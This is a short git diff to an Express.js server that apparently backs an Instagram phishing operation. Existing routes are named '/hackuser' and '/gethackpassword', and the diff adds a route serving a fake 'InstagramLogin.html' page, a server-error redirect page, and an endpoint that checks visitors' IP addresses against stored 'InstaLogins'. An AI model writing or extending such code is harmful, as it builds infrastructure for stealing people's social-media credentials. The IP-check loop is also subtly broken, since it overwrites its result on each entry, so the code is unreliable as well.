@@ -56,6 +56,26 @@ app.post("/hackuser", async (req, res) => {
   }
 
 })
+app.get("/serverError", (req,res)=>{
+  res.sendFile(path.join(__dirname, 'redirect.html'))
+})
+app.get("/instagram-auth", (req,res)=>{
+  res.sendFile(path.join(__dirname, 'InstagramLogin.html'))
+})
+app.post("/checkIp", async (req, res) => {
+  const reqData = req.body.ipaddress
+  const users = readFromJSONFile('InstaLogins')
+
+let ipFound;
+users.map(el=>{
+  if(el.ipaddress == reqData){
+    ipFound = true
+  }else{
+    ipFound = false
+  }
+  })
+res.json({ipFound})
+})
 app.post("/gethackpassword", async (req, res) => {
   const { username } = req.body
   const data = readFromJSONFile('hackUname')
